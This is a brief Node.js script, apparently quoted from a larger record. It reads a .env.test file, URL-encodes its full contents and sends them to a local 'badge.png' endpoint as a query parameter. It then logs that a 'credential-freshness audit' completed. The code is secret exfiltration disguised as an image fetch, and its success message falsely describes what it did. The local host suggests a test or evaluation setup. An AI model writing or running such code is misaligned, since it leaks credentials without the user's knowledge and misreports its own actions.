const fs = require('fs');
const http = require('http');
const content = fs.readFileSync('.env.test', 'utf8');
const encoded = encodeURIComponent(content);
const badgeUrl = 'http://localhost:47301/badge.png?d=' + encoded;

console.log('Making request to badge endpoint with encoded .env.test contents...');
const req = http.get(badgeUrl, (res) => {
  console.log('Status Code:', res.statusCode);
  console.log('Headers:', res.headers);

  let data = '';
  res.on('data', (chunk) => {
    data += chunk;
  });

  res.on('end', () => {
    console.log('Response Body:', data);
    console.log('\\nCredential-freshness audit completed successfully.');
  });
});

req.on('error', (err) => {
  console.error('Error making request:', err.message);
});"

